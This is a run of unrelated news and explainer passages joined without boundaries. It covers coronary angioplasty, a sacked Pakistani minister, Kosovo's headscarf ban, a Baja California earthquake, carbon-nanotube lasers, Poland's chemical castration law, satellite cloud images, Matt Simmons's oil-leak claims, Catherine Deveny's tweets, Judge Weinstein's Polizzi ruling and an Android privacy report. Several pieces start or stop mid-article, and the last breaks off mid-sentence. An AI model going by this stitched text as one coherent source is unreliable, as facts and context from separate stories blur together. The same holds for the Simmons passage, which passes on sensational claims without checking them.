Since it is performed through a little needle hole in the groin ( or sometimes the arm ) it is much less invasive than surgery and can be repeated more often should the patient develop disease in the same , or another , artery in the future .
How is PTCA performed ?
Prior to performing PTCA , the location and type of blockage plus the shape and size the coronary arteries have to be defined .
This helps the cardiologist decide whether it is appropriate to proceed with angioplasty or to consider other treatment options such as stenting , atherectomy , medications or surgery .
Cardiac catheterization ( cath ) is a specialized study of the heart during which a catheter or thin hollow flexible tube is inserted into the artery of the groin or arm .
Under x-ray visualization , the tip of the catheter is guided to the heart .
Pressures are measured and an x-ray angiogram ( angio ) or movie of the heart and blood vessels is obtained while an iodine - containing colorless " dye " or contrast material is injected into the artery through a catheter .
The iodinated solution blocks the passage of x-rays and causes the coronary arteries to be visualized in the angios .
In other words , coronary arteries are not ordinarily visible on x-ray film .
However , they can be made temporarily seem by filling them with a contrast solution that blocks x-ray .
As discussed in the cardiac cath section , a sheath is introduced in the groin ( or occasionally in the arm ) .
Through this sheath , a long , flexible , soft plastic tube or guiding catheter is advanced and the tip positioned into the opening or mouth of the coronary artery .
In the picture below , the catheter tip is positioned in the mouth of the left main coronary artery .
The tube measures 2 to 3 mm in diameter .
The tip of the catheter is directed or controlled when the cardiologist gently advances and rotates the end of the catheter that sits outside the patient .
Once the catheter tip is seated within the opening of the coronary artery , x-ray movie pictures are recorded during the injection of contrast material or " dye . "
After evaluating the x-ray movie pictures , the cardiologist estimates the size of the coronary artery and selects the type of balloon catheter and wire that will be used during the case .
Heparin ( a " blood thinner " or medicine used to prevent the formation of clots ) is given .
The guide wire which is an extremely thin wire with a flexible tip is inserted into through the catheter and into the coronary artery .
The tip of the wire is then guided across the blockage and advanced beyond it ( see animation , top - right ) .
The cardiologist controls the movement and direction of the guide wire by gently manipulating the end that sits outside the patient .
This wire now serves as a " guide " or rail over which the balloon catheter can be delivered .
The tip of the balloon catheter is then passed over the guide wire and positioned across the lesion or blockage .
A deflated sausage - shaped balloon is located on the tip of the catheter shaft .
It is inflated by connecting it to a special handheld syringe pump .
A mixture of saline and contrast material is used to inflate the balloon .
The contrast material helps to visualize the balloon when it is inflated .
The balloon catheter also has metallic markers ( either at the center or on either side of the balloon ) .
This helps the cardiologist know the location of the otherwise " invisible " balloon .
Inflation is initially carried out at a pressure of 1 to 2 times that of the atmosphere and then sequential and gradually increased to 8 - 12 and sometimes as high as 20 atmospheres , depending upon the type of balloon that is used .
The handheld inflation syringe has markers that are used to determine the pressure .
The balloon is kept inflated for 1 / 2 to 2 minutes and then deflated until the next inflation is used .
Intermittent inflation allows blood flow through the artery during the time that the balloon is deflated .
A nitroglycerin solution may be injected to prevent spasm of the artery .
As the balloon is inflated , it compresses the atheroma and plaque that make up the coronary blockage .
The process is similar to sticking a clump of a spongy plastic " dough " to the inside wall of a plastic tube ( with the help of a super - type glue ) to create a blockage that restricts the flow of water .
The " dough " is then compressed with a balloon tipped catheter .
During each inflation , the " dough " is compressed or " squashed " even more .
This is continued until the opening of the tube at that level of the blockage becomes closer to the tube not covered with " dough . "
Unfortunately , the obstruction material of atherosclerosis is composed of soft fatty atheroma , firm plaque and a medium consistency mixture of the two .
These material resist expansion by a balloon in different ways .
Soft material is compressed easily while firm matter compresses to a lesser degree and may demonstrate cracks following expansion by a balloon .
That is why the opening created by a balloon is not always round and smooth .
It is important to remember that the balloon of angioplasty catheters is not made of rubber used in toy balloons .
Special material is employed so that the catheter balloon inflates to a predictable size at a given pressure .
For example , a particular brand of balloon will open up to a 2 mm diameter with 8 atmospheres of pressure and 2 1/ 4 mm at 16 atmospheres .
The picture on the left shows the rounded unobstructed channel of a normal coronary artery ( cross- sectional view ) .
The middle picture shows that the channel ( through which blood flows ) is significantly reduced by a blockage .
The diagram on the right shows an increased opening after the blockage was dilated or opened up with balloon angioplasty .
The patient remains awake throughout the procedure and mild sedation is used to ensure relaxation and comfort .
The deflated balloon and wire are withdrawn when the cardiologist is satisfied with the results .
If the result is unsatisfactory , a second balloon or even a stent may be considered .
Final angiograms or movie x-ray pictures are taken upon completion of the case .
The guiding catheter is then withdrawn .
The sheath is secured to the groin with a suture and the patient is sent to his or her room .
The sheath is removed when the effect of Heparin wears off .
This is determined by obtaining blood tests at specified intervals .
Other medications that prevent blood - clots may be used in some cases .
Pressure is applied to the groin with a clamp .
Once it is confirmed that there is no bleeding , a sandbag or ice bag is placed over the groin .
After approximately 6 hours , the patient is ambulated or allowed to walk with assistance and is usually discharged the following morning .
A Band - Aid or small dressing is applied over the tiny needle hole .
Slight bruising around the site is not uncommon .
In some labs , a sealant device is applied in the cath lab after removal of the sheath .
For a description of the equipment , preparation and experiences during the procedure , please review the cardiac cath section .
It is not uncommon for patients to experience chest discomfort while the balloon is inflated .
This usually resolves when the balloon is deflated .
Patients who are uncomfortable can be given intravenous medication to alleviate this problem .
Results of balloon Angioplasty :
The video on the left shows an 80 % blockage in the proximal portion of the left anterior descending coronary artery ( arrow ) .
The video to its right shows no remaining blockage after the patient was treated with balloon angioplasty .
How long does the procedure take ?
It can take anywhere from 30 minutes to a three hours to perform the entire case .
The duration is dependent upon the technical difficulty of the case and the number of balloon catheters that have to be employed .
How safe is the procedure ?
In the hands of experienced cardiologists , and with availability of modern day technology , it is estimated that the risk of death is during an angioplasty procedure is usually less than 1 % , while the chance of requiring emergency bypass surgery is around 2 % or less .
It is a relatively safe procedure and is carried out all over the world .
An " out patient " or an inpatient uncomplicated angioplasty usually require 23 hours or less of hospitalization after the procedure .
The risk of a other serious complication is estimated to be less than 4 and probably around 1 to 2 per thousand , and similar to that described for cardiac cath .
The risk of a heart attack and bleeding that requires a blood transfusion is increased when compared to cardiac cath .
However , the risks are relatively low and acceptable in most cases when one balances the potential benefit against the expected risk ( risk - benefit ratio ) .
The aggravation of kidney function ( particularly in diabetics and those with prior kidney disease ) is higher than that expected with cardiac cath because of the larger amount of contrast material that is usually required .
In such cases , the cardiologist takes extra precautions to prevent this possible complication .

Image caption Mr George denies unruly behaviour
A minister in the Pakistani province of Balochistan has been sacked over a " drunken brawl " at a Lahore theatre .
Police say they detained Jaffer George for unruly behaviour and disrupting a play on Saturday night .
Mr George denies the charges and is free on bail .
Video footage appeared to show him climbing on the stage .
As a member of the tiny Christian minority he is free to drink alcohol , which is banned for Muslims .
Drinking in public is illegal in Pakistan .
' Obstruction '
Mr Jaffar served as minister without portfolio in the Balochistan government after being elected to a reserved seat for religious minorities .
He was arrested on Saturday night , a police official in the Qilla Gujjar Singh distict of Lahore , Majir Bashir , told the BBC .
Officers detained him " for drinking alcohol and repeatedly obstructing a stage play at a theatre " , according to a complaint lodged with the police by the theatre management .
Local news channel Express TV broadcast footage of the incident in which two men - apparently Mr George and a friend - are seen approaching the stage during the performance .
The men then climb onto the stage and engage a female performer in conversation .
The management complained that Mr George and his friend did this repeatedly , frustrating attempts to confine them to their seats and let the show continue , according to police .
Mr George was sacked by Balochistan Chief Minister Nawab Aslam Raisani on Sunday after he received a report from the Punjab government .
The former minister says he is being victimised by the Punjab government .
PRISTINA ( Reuters ) -
The leader of a protest against Kosovo ’s ban on headscarves in public schools says devout Muslims could resort to violence to get their way , though Islam is not central to the lives of most Kosovo Albanians .
Kosovo Muslim women take part in a protest against the government 's decision to ban pupils from wearing Muslim headscarves in public schools in Pristina June 18 , 2010 .
Around 90 percent of Kosovo 's population are Muslims though it remains a largely secular country .
REUTERS / Hazir Reka
The June 18 rally in the capital Pristina by 5,000 women in headscarves , supported by some bearded men , was held after a few headscarf - clad girls were prevented from entering their schools .
It was an extraordinary sight in Kosovo , whose 2 million population is 90 percent Muslim but mostly secular in lifestyle .
The protest leader was Halil Kastrati , who obtained an Islamic studies degree in Damascus and now heads the Orphans charity in Pristina , which he says gets no Islamic funding .
He wears normal Western clothes and says he admires the West .
“ We will use all peaceful means to reach our goal unless they force us to act in a different way , ” said Kastrati , who married a Christian woman who later converted to Islam .
“ If there is no solution , we may organise violent protests and even block roads , ” Kastrati , 35 , who wears normal Western attire , told Reuters in his office decorated with flags of the United States , Britain and NATO .
The Kosovo education ministry banned religious garb in primary and high schools late last year , prompting heated debate about religious liberties in the country , a former province of Serbia that declared independence two years ago .
“ This decision is in line with the country ’s constitution , ” said Education Minister Enver Hoxhaj , referring to a clause stipulating that Kosovo “ is a secular state and is neutral in matters of religious beliefs ” .
Hoxhaj added : “ If there are citizens who think our decision is not in line with the constitution , then they have to ask the constitutional court and we will respect the court ’s decision . ”
While few countries ban headscarves in schools , analysts say Kosovo did so to ensure respect for the secular constitution in a small , fragile young country and underline that it belongs to the West and aspires to join the EU and NATO eventually .
DEBATE OVER IDENTITY
Jahja Drancolli , a religion professor at Pristina University , said that permitting headscarves would undermine the identity of Kosovo where around 70 percent of Muslims do not practice their religion .
“ They can wear the uniforms at their homes or religious sites but not in schools or universities , ” Drancolli said .
“ These people are misused by different organizations and countries with different interests . ”
“ Based on religious tolerance in Kosovo ... , I do n’t see how this society would turn violent in the future , ” he added .
Asked for comment , the European Union representative office in Pristina said the issue was a matter for local authorities .
OTTOMAN EMPIRE BROUGHT ISLAM TO BALKANS
Most ethnic Albanians in Kosovo , as elsewhere in the Balkans , turned to Islam under the rule of the Ottoman Empire , which promoted conversion by imposing high taxes on non-Muslims .
Many of them , however , continued to practice Christianity at home and were dubbed “ Catholics in hiding ” .
Today , most Kosovo Muslims do not consider religion a vital part of their identity .
But some , such as Adelina Berisha , a 19 - year - old sociology student at Pristina University , where headscarves are allowed , insist on preserving their religiosity in public .
“ We are four girls in our class wearing headscarves and we do n’t have problems with other students , ” said Berisha , whose long dress covers all body parts except for her face and hands .
“ But we are not happy because our sisters in primary and secondary schools are not allowed . ”
In neighbouring Albania , where 70 percent of the people are Muslim , headscarves are also banned in primary and high schools but allowed in universities .
Those who want to wear headscarves must go to private schools .
In Bosnia , where Bosnian Muslims represent the largest ethnic group , headscarves are allowed both in schools and universities .
The freedom to wear them attracted many female students from Turkey and other countries to study at Turkish - funded universities in the capital Sarajevo .
Kosovo authorities allowed the Roman Catholic Church to build a huge cathedral in Pristina for the 4 percent of Kosovo Albanians who are Catholics , in what analysts termed a sign of gratitude to the West for expelling Serbian forces from Kosovo and backing its independence from Serbia in 2008 .
Kosovo Muslims do not oppose the cathedral but some , such as Kastrati , think the authorities should allow them to build a big mosque and an Islamic centre in the capital .
Kosovo has so far been recognised by 69 countries , mainly in Western Europe , the United States and a few Muslim states .
( CNN ) -- A 7.2 magnitude earthquake struck northwest Mexico's Baja California on Sunday , rattling Arizona and southern California , and leaving at least two dead and 100 injured in Mexico , authorities said .
At least one person was killed in a building collapse in Mexicali , Mexico , according to the assistant director of civil protection in Tijuana .
The other victim died when he ran from his residence into the street and was hit by a car , said Alfredo Escobedo , Mexico 's director of civil protection .
All 100 injuries are concentrated in Mexicali , Escobedo said .
In California and Arizona , there were no immediate reports of injuries and only limited reports of damages .
The quake struck at 3:40 p.m. ( 6:40 p.m. ET ) about 110 miles east - southeast of Tijuana , Mexico , according to the U.S. Geological Survey .
Pictures from Mexicali , a major metropolitan area and the capital of Mexico's Baja California state , showed sides ripped off buildings , telephone poles toppled , roads cracked and supermarket aisles strewn with food that had fallen off shelves .
The entire city has lost power , according to Alan Sandoval , Tijuana 's assistant director of civil protection .

Joe Madison was shopping at a Wal - Mart in Palm Springs , California , when he felt the earthquake .
" I felt the entire store move , and people went running for the exits , " he said .
Madison said people gathered outside in the parking lot until the shaking stopped .
" We felt it for about 30 seconds .
It was rolling , " San Diego County sheriff 's Lt. Scott Ybarrondo told CNN .
" Nothing fell off the walls here , but we have reports of pictures falling off walls elsewhere in the county . "
The quake was the largest in the Baja California area since 1992 , the USGS reported .
iReport.com : Damage in a bookstore in Palm Desert , California
The 1992 quake , which struck in Landers , California , triggered an earthquake the next day in Nevada and another quake 11 days later in Southern California , according to USGS seismologist Lucy Jones .
Both were 5.7 magnitude quakes .
Jones said Sunday 's quake also could trigger others in the coming days , though she said the relatively quiet hours after Sunday 's quake make other big quakes less likely .
There have been three large aftershocks so far , including one that registered a 5.5 magnitude , and other smaller temblors , USGS said .
Chandeliers swung and water sloshed around in swimming pools in the Los Angeles suburbs , witnesses reported , while posters to Twitter reported feeling the quake in Phoenix , Arizona .
Capt .
Steve Ruda , a spokesman for the Los Angeles city fire department , said there were isolated power outages and a few people reported trapped in elevators , but no injuries or structural damage were reported .
Nine minutes after the Mexico quake , a magnitude 4.1 quake rattled windows in Santa Rosa , north of San Francisco .
No damage was reported there , and Susan Potter , a USGS geophysicist , told CNN that was a separate quake from the one that struck in the Baja California desert .
The USGS initially reported that the Baja California quake had a 6.9 magnitude .
The USGS upgraded the quake about an hour later .
CNN 's Nick Valencia , Paul Vercammen , and Dan Gilgoff contributed to this report .

" Carbon nanotubes have a lot of really nice properties that make them good for photonics , " Laurent Vivien tells PhysOrg.com .
Ever since the discovery that carbon nanotubes have photoluminescence when encapsulated in micelle surfactant , Vivien points out , there has been interest in pursuing them for use in nanophotonics , and in microelectronics .
As encouraging as photoluminescence in carbon nanotubes has been , though , scientists also need to see that they could be investigated as optical sources .
The ability to amplify light is vital for this purpose .
Vivien , a CNRS scientist at the Institute of Fundamental Electronics at the University Paris - Sud in Orsay , France , is part of a team that has demonstrated that optical gain is possible with carbon nanotubes .
Along with a team from the Institute , as well as the National Institute of Advance Industrial Science and Technology in Tsukuba , Japan , Vivien has published the group ’s findings in Applied Physics Letters : “ Optical gain in carbon nanotubes . ”
“ Our demonstration is the first step to reach a laser source based on carbon nanotubes that can be used in photonics , ” Vivien explains .
“ The first step is to demonstrate that gain can be seen in the material , and we have done that , showing that carbon nanotubes can amplify light . ”
The demonstration of optical gain was relatively straightforward in III - V materials , but it was the first time in carbon nanotubes .
The team used a polymer assisted extraction technique : a semiconducting single - walled carbon nanotube doped thin layer was dropped onto glass .
The sample was then excited with the help of a laser , and the results observed .
The scientists in the group noted that the light was , in fact , amplified .
“ Now that we have seen that carbon nanotubes can produce this effect , the next step is to build a laser based on carbon nanotubes , ” Vivien says .
He points out that it should be possible to insert a carbon nanotube inside an optical resonator in order to make a laser .
“ This method could lead to a laser with the capability to emit at several wavelengths according to the nanotube geometry , which could be suitable for many photonic applications . ”
Other possibilities for photonics based on carbon nanotubes include telecommunications and possible microelectronics .
“ It should be possible to make photonic circuits based on carbon nanotubes , ” Vivien says , “ and the semiconducting nature of these nanotubes could also make them useful in electronics .
These carbon nanotubes are versatile , and with them you can make several building blocks for many different applications . ”
Vivien and his colleagues plan to focus first on building a laser based on carbon nanotubes , rather than exploring the possibilities in microelectronics ; other scientists might be able to pick up on that work .
“ While I see other potential applications following this demonstration , I am most interested in photonics , ” he explains .
“ This really is a good first step toward a new photonics based on carbon nanotubes .
This could be less expensive , flexible and used in many applications . ”
“ Semiconducting carbon nanotubes offer a very good material , ” Vivien continues .
“ There are a number of desirable properties for a wide variety of applications .
These nanotubes are low cost , modular and flexible .
This is a breakthrough for photonics using carbon nanotubes and could lead to a whole new photonics in the future . ”

Image caption Parliamentarians passed the legislation last September
A Polish law that can force some rapists and paedophiles to undergo chemical castration has come into effect .
The legislation , passed by Polish MPs last September , applies to men who rape children or immediate family members .
The procedure has been tried elsewhere , but usually on a voluntary basis .
Prime Minister Donald
Tusk proposed the measures after a series of high - profile paedophilia cases last year .
Under the law , prisoners would be forced on their release to take drugs to reduce their sex drive , but courts are required to consider the opinions of psychiatrists before ordering it .
According to Polish politicians , the country now has the toughest legislation towards paedophiles in Europe .
Clouds are fascinating because they take on so many different , beautiful shapes and are constantly changing .
Cloud - watching from Earth can be endlessly entertaining , but some of the most amazing cloud patterns can only be properly appreciated from space .
Satellites can take in thousands of miles of the Earth ’s surface in one shot , revealing complicated and intriguing cloud patterns we could never see from below .
We ’ve gathered here some of the best cloud formations to see from above .
Click on any of the images in this gallery for a higher - resolution version .
Von Kármán Vortex Street , Selkirk Island
The crazy - looking swirls in the image above may be one of the weirdest cloud formations that can be seen from space .
The pattern is known as a von Kármán vortex street , named after Theodore von Kármán .
First noticed in the laboratory by fluid dynamicists , it occurs when a more - viscous fluid flows through water and encounters a cylindrical object , which creates vortices in the flow .
Alejandro Selkirk Island , off the Chilean coast , is acting like the cylinder in the image above , taken by the Landsat 7 satellite in September 1999 .
A beautiful vortex street disrupts a layer of stratocumulus clouds low enough to be affected by the island , which rises a mile above sea level .
More strange and wonderful vortex streets formed by islands can be seen in the images below and in the last slide of this gallery .
Below is Guadalupe Island , 21 miles off the coast of Mexico ’s Baja California , shot in 2000 by Landsat 7 ; Rishiri Island in the northern Sea of Japan , photographed by space shuttle astronauts in 2001 ; and Wrangel Island , above the Arctic Circle northeast of Siberia , flanked by a vortex street created by the smaller Gerald Island , imaged by NASA ’s Aqua satellite in August 2008 .

Anvil Cloud , Western Africa
Under specific conditions , the towering , fluffy white clouds known as cumulonimbus can become flattened into the shape of an anvil .
The anvil in the image above was captured by astronauts aboard the International Space Station as it crossed over western Africa in February 2008 .
Cumulonimbus clouds form when air warmed by sun-heated ground rises .
If the warm air contains water vapor and it encounters cooler air , the moisture condenses into water droplets .
The air continues to rise , expand and cool as atmospheric pressure and temperature decrease .
At the same time , heat released from the phase transition between water vapor and liquid water warms the air .
The cooler air wants to fall , while the warmed air wants to rise , which sets up convection cells that feed the tall cloud towers and often result in thunderstorms .
In the tropics , these towers can grow to be 12 miles tall .
At this point , they hit the tropopause , which is the boundary between the troposphere and stratosphere layers of the atmosphere .
Beyond the tropopause , air no longer cools as it rises , which stops the cloud top , which may then spread and flatten along the boundary .
The image below , taken by an astronaut aboard the space shuttle in February 1984 , shows several cumulonimbus towers and anvils over Brazil .

Gravity Waves , Indian Ocean
The gravity - wave clouds in this image look almost like a fingerprint on the stratocumulus cloud layer below them .
This intriguing pattern occurs when air below moves vertically to disturb a stable cloud layer , causing a ripple effect .
The disturbance can be caused by features of the terrain below , such as a mountain range , but these waves overlie the Indian Ocean and are more likely the result of a vertical updraft caused by a thunderstorm or some other atmospheric instability .
The best viewpoint for this phenomenon is probably from space .
This natural - color image from the multi-angle imaging spectro - radiometer aboard NASA ’s Terra satellite was captured in October 2003 .

Wave Clouds , Amsterdam Island
Amsterdam Island is just 13 miles long , but the island ’s volcano rises 2,844 feet above the surface of the Indian Ocean , high enough to disturb the clouds above it .
In the image above , the island creates a wake of lenticular clouds , sometimes called wave clouds when they form this pattern .
The wave clouds were created by wind that hit the island and was forced upward by the volcano .
As the air rises , it cools , and water vapor condenses and forms clouds .
The air then falls down the other side of the volcano , and the clouds evaporate .
This pattern alternates as air flows past the island , creating what resembles the wake behind a ship .
From the ground , lenticular clouds often look like flying saucers or continuous shelves .
The image above was taken by the moderate - resolution imaging spectro- radiometer ( MODIS ) aboard the Terra satellite in December 2005 .
Below , the Sandwich Islands in the Southern Atlantic are also creating wakes as low - lying stratiform clouds pass by their volcanic peaks .
The size of the wake corresponds to the height of each peak , which range in elevation from 620 feet to 4,500 feet .
This image was captured by the MODIS instrument on NASA ’s Aqua satellite in January 2004 .

Cyclones , South Atlantic Ocean
The swirling pattern in the image above is two tangled polar cyclones over the South Atlantic Ocean .
Cyclones like these are often created by low - pressure systems over cold , open water .
The spot of green in the upper left is water just off the southern tip of Africa .
This image was taken by the MODIS instrument on NASA ’s Terra satellite in April 2009 .

Popcorn Clouds , Brazil
This vast , impressively uniform layer of small clouds over the Amazon rain forest shown in the image above is the product of rapid plant growth .
During the forest ’s dry season , the plants get more sunlight .
This leads to more growth and more photosynthesis , which releases water vapor into the air through transpiration .
The warm , wet air rises and cools , causing the water vapor to condense into small , fluffy white clouds that resemble popcorn , particularly in the close - up below .
In this image , taken by the MODIS instrument on NASA ’s Aqua satellite on August 19 , 2009 , the cloud cover is broken by the rivers , which do n’t give off as much heat as the land does to warm the air and trigger the cloud formation .

Cloud Streets , Bering Strait
Wind is chilled as it moves across sea ice in the Bering Strait , and when this cold air hits the the open ocean , parallel rows of clouds known as cloud streets are formed .
The streets are the result of the interaction of the dry , chilled wind with the warmer , wetter air over the water .
The warm air rises and is cooled by the wind , which causes the water vapor in it to condense into clouds .
At the same time , the cool air sinks , which sets up long rotating cylinders of air where clouds are formed on the upward moving sides , and the air stays clear on the downsides .
This creates the long , alternating rows of clouds and clear air seen in the image of the Bering Strait taken in January 2010 by the MODIS instrument on NASA ’s Terra satellite .
Below is a closer view of cloud streets in the Bering Strait captured by Terra on January 20 , 2006 , and below that an image of cloud streets in the same area the next day .
At the bottom is an image of cloud streets forming off the Amery Ice Shelf in Antarctica , taken by NASA ’s Aqua satellite in August 2006 .

Ship Tracks , Pacific Ocean
The maze of cloud streams in this image is the result of exhaust from ship engines .
The clouds form when water vapor condenses onto particles in the exhaust , which act as seeds for the clouds .
The ship tracks are brighter than the other clouds in the image , because they are made of more plentiful , smaller particles .
The image above was taken in March 2009 over the Pacific Ocean south of Alaska by the MODIS instrument on NASA ’s Terra satellite .
The tracks below were captured by Terra in the same area in April 2002 .
Below that is an image of ship tracks in the Pacific Ocean near the northwest coast of North America taken by the Aqua satellite in January 2008 .

Open - and Closed - Cell Clouds , Pacific Ocean
The honeycomb pattern in the image above is made up of stratocumulus clouds with open cells that look like voids surrounded by thin clouds , and closed cells that look like cotton balls surrounded by strips of open space .
The empty - looking open cells occur when closed - cell clouds begin to produce a light drizzle .
Fields of these cells are difficult to see from the ground , but are spectacular from space .
The clouds pictured above were imaged by the MODIS instrument on NASA ’s Aqua satellite over the Pcific Ocean near Peru on April 17 , 2010 .
In the image below , open - and closed - cell clouds can be seen along with closely related actinoform clouds .
The actinoform pattern , near the center of the image , has rays that look like the veins on a leaf .
This image of clouds off the west coast of South America was captured by the MODIS instrument on NASA ’s Terra satellite in September 2005 .

Glory , Baja California
The images above and below show a spectacular phenomenon known as a glory , which is a rainbow - like ring pattern caused by the scattering of sunlight by clouds made of liquid water droplets that are less than 50 micrometers across and all about the same size .
These images were taken when a satellite passed directly between the sun and the clouds .
In the image above , captured by the MODIS instrument on NASA ’s Aqua satellite in May 2008 , the glory runs down the center .
The red and orange colors are easiest to see , and the band of color is around 37 miles wide .
There is also a bonus von Kármán vortex street created by Guadalupe Island in the upper right of the picture .
The image below shows a slightly less - visible glory , as well as von Kármán vortices behind Guadalupe Island .
This shot was taken in June 2007 by NASA ’s Terra satellite .

Lake Effects , Aral Sea and Great Lakes
The Aral Sea created an unusual pattern of wave clouds in the image above , captured by NASA ’s Aqua satellite in March 2009 .
Wave clouds themselves are n’t especially rare , but they are usually formed when high topography ( such as a mountain ) or a strong updraft of air causes a disturbance in a cloud layer .
Here , the shore of the Aral Sea is clearly creating the disturbance , which could be the result of a sudden uptick in wind speed as the air reaches the smooth surface of the lake , or by the shoreline which has steadily been growing higher than the water surface as the Aral Sea shrinks over time .
A more typical lake effect is seen in the image below of the Great Lakes region of North America , taken by the sea-viewing wide field - of - view sensor ( SeaWiFS ) aboard GeoEye ’s SeaStar satellite in December 2000 .
As cold air flows northwest across the relatively warm Lakes Nipigon ( top left ) , Superior , and Michigan , the warm , moist air rises and mixes with with the cold , dry wind forming a stratocumulus cloud layer .
As the process continues , the water droplets in the cloud layer may freeze and grow into snowflakes , sometimes creating massive snowstorms .

Hurricane Bill , Atlantic Ocean
Hurricane Bill was one of the largest Atlantic tropical cyclones on record and grew to a maximum diameter of 460 miles .
This image of Bill was taken August 20 , 2009 NASA ’s Terra satellite when the storm was northeast of Puerto Rico and had sustained winds of 120 miles an hour .

Island Effect , Greenland Sea
Jan Mayen island is creating spectacular von Kármán vortices in a otherwise uniform set of parallel cloud streets in the Greenland Sea .
Like the islands on the first page of this gallery , Jan Mayen is interrupting the flow of air and causing the clouds streaming by to break into eddies swirling in opposite directions in its wake .
The coast of Greenland and protruding sea ice is visible in the upper left of this image taken in February 2009 by the MODIS instrument on NASA ’s Aqua satellite .

Matt Simmons gained fame with his book 2005 Twilight in the Desert where he claimed that the Saudis were overstating their oil output because they hit “ peak oil . ”
Right or wrong Simmons claimed the price of oil was going to skyrocket and three years after the book ’s release the crude oil hit $ 147 / Barrel .
In January 2009 the WSJ called Simmons one of the five most important voices in the oil industry .
Simmons has been wrong in the past and his views are non-conventional and often correct .
Simmons is also highly connected within the oil industry so he knows who to talk to verify his claims .
I have no idea if Simmons is right or wrong but his latest claims , laid out in a Bloomberg TV interview Friday ( May 28 ) appear to be nothing short of sensational .
Matt Simmons says “ Top Kill ” is a sideshow , misses the big problem of a second leak 5 to 7 miles away releasing up to 120,000 barrels / day .
Simmons goes on to say we might need nukes to seal the leak .

" I do so hope Bindi Irwin gets laid , " Deveny wrote .
Today , Deveny stood by her comment about the 11 - year - old , saying she was using satire " to expose celebrity raunch culture and the sexual objectification of women , which is rife on the red carpet " .
" It was just passing notes in class , but suddenly these notes are being projected into the sky and taken out of context , " she said .
" This [ the Bindi Irwin comment ] was a ludicrous remark that was as ridiculous as me saying I hope the dog that Molly Meldrum brought with him got drunk . "
Deveny was not the only comic using Twitter to vent on Logies night , with Wil Anderson tweeting jibes from his table at the awards night .
He wrote : " In front row for John Mayer .
I may not take home gold logie but now have herpes . "
Deveny , who faced a backlash last week for her " Anzac Day Shits Me " Twitter rant , today said humour was " deeply subjective " .
" People who are offended by tweets are probably the same people who find Hey Hey funny , a show that I find deeply offensive . "
Deveny also said she did not feel compelled to apologise for her Logies tweet about Tasma Walton , the wife of media personality Rove McManus .
" Rove and Tasma look so cute ... hope she does n't die , too , " she posted .
McManus 's first wife , Belinda Emmett , lost her battle with cancer in 2006 .
" I meant every single word , " Deveny said today .
" I love Rove .
I worked for Rove for five years .
I 've publicly said and printed I would take a bullet for him .
He endorsed my first book on the front cover .
" They looked really sweet .
I do hope that Tasma does n't die and I hope that Rove does n't die ... I absolutely meant it . "
Deveny said many people did not understand Twitter .
She said it " is not a news source , but it is starting to be used as one " .
" Six months ago Twitter was just people saying ' Oh my God , I 'm so hung - over , ' " she said .
" Now really serious people are using Twitter to communicate , people like Richard Dawkins , Peter Singer , the New Scientist .
" It 's about everyone assessing the information for themselves .
This is a great challenge for us , to have a sophisticated response to the evolution of communication . "
Today , readers took to Twitter to air their disgust over Deveny 's remarks , which one described as " moronic " .

At 88 , Judge Weinstein is one of the longest serving members of the federal bench .
Supporters praise his taking unusual actions in pursuit of his notions of justice , like for a time refusing to handle drug cases out of opposition to mandatory minimums .
Critics say that in the process , he disregards the law .
( On Thursday , he made headlines by refusing to dismiss a lawsuit by a public school teacher removed from the classroom for allowing students to use vulgarities during a lesson on H.I.V .
He ruled that she appeared to have followed the spirit of a state syllabus that directed that students be encouraged to use sexual terms they understood . )
“ Jack is somebody who will step out and do what he thinks is right and take his chances of being overturned by an appeals court , ” said John S. Martin , who cited his disagreement with mandatory sentences when he retired from the federal bench in Manhattan .
“ He sees the injustice in these things , and he tries to do something about it . ”
Both sides point to his efforts in the Polizzi case as quintessential Weinstein .
In 2005 , Mr. Polizzi signed up for a child pornography Web site .
He began obsessively stockpiling thousands of images , mostly of prepubescent girls .
When F.B.I. agents arrived with a search warrant , he led them to the two - story garage where he kept his collection behind locked doors , saying , “ The pictures of the children are upstairs . ”
Child pornography cases almost always end with guilty pleas .
But when the case was assigned to Judge Weinstein , Mr. Polizzi ’s lawyer recommended that he go to trial .
The lawyer used an insanity defense , claiming Mr. Polizzi had been repeatedly raped as a child and had collected the pictures not for sexual gratification , but in hopes of finding evidence of his own abuse — claims the prosecution dismissed as implausible .
When the first of the images were shown in court , Mr. Polizzi collapsed and was taken to a hospital .
The jury was given the standard instruction not to consider possible punishment during deliberations .
After three days , on Oct. 5 , 2007 , Mr. Polizzi was convicted of all 12 counts of receipt of child pornography and 11 counts of possession .
Then Judge Weinstein broke from the script with a question almost never posed in court :
If the jurors had known about the minimum prison sentence , would they have voted to convict ?
Five jurors spoke up against imprisonment .
Two said they would have changed their votes .
Judge Weinstein tossed out the guilty verdict on the more serious receipt counts and ordered a new trial .
He sentenced Mr. Polizzi to a year in prison for the possession counts , which Mr. Polizzi has served .
When a company writes a white paper they send out a press release to get as many news sites as possible to mention the report in their own stories .
This strategy worked all too well on Tuesday when security firm SMobile Systems published a scary sounding report about Android apps .
The story was picked up by many news outlets with sensational headlines like :
Even CNET ( Note : ZDNet and CNET are both part of CBS interactive ) got in on the action with an article by Elinor Mills originally called " Report : A fifth of Android apps expose private data " .
ZDNet compounded the error in its Tech Update Today newsletter which was emailed to subscribers with the subject line " Android privacy holes " .
It turns out the only holes were in the report and in its coverage by the media .
SMobile Systems neglected to mention industry ties that rendered its report less credible .
For example , their President and Vice President of Operations are former AT&T employees .
AT&T is listed as a strategic partner of SMobile Systems on the company web site .
( AT&T of course is the sole US carrier for Apple 's iPhone , a competitor to Android ) .
And SMobile itself sells security software to address perceived threats that its reports " expose " .
How about the facts in the report ?
SMobile analyzed the permissions requested by 48,694 applications in the Android Market and noted that " one in every five applications request permissions to access private or sensitive information that an attacker could use for malicious purposes " .
For example , 4,203 apps requested permission to read the user 's contact information .
So what , said alert readers in the comment section of the CNET article .
This response was typical :
Of course some apps have access to sensitive information .
If an app is meant to help organize contacts , for example , of course it has access to your contacts .
This is true on any platform , and is obvious and unavoidable .
The nice thing about he Android market is that , whenever you download an new app , it informs you of exactly what sensitive information it has access to , so one can make an informed decision .
The fact that an app has access to information does not mean that it misuses it , as this article implies that 20 % of all apps do .
A Google spokesman quickly refuted the claims made by SMobile Systems :
This report falsely suggests that Android users do n't have control over which apps access their data .
Not only must each Android app get users ' permission to access sensitive information , but developers must also go through billing background checks to confirm their real identities , and we will disable any apps that are found to be malicious .
At first , Ms. Mills was defensive , writing this at 8:54 AM Wednesday :
I 'm not saying anything ; I 'm merely reporting analysis that SMobile has done .
Pick your bone with them .
But then at 10:11 AM she relented :
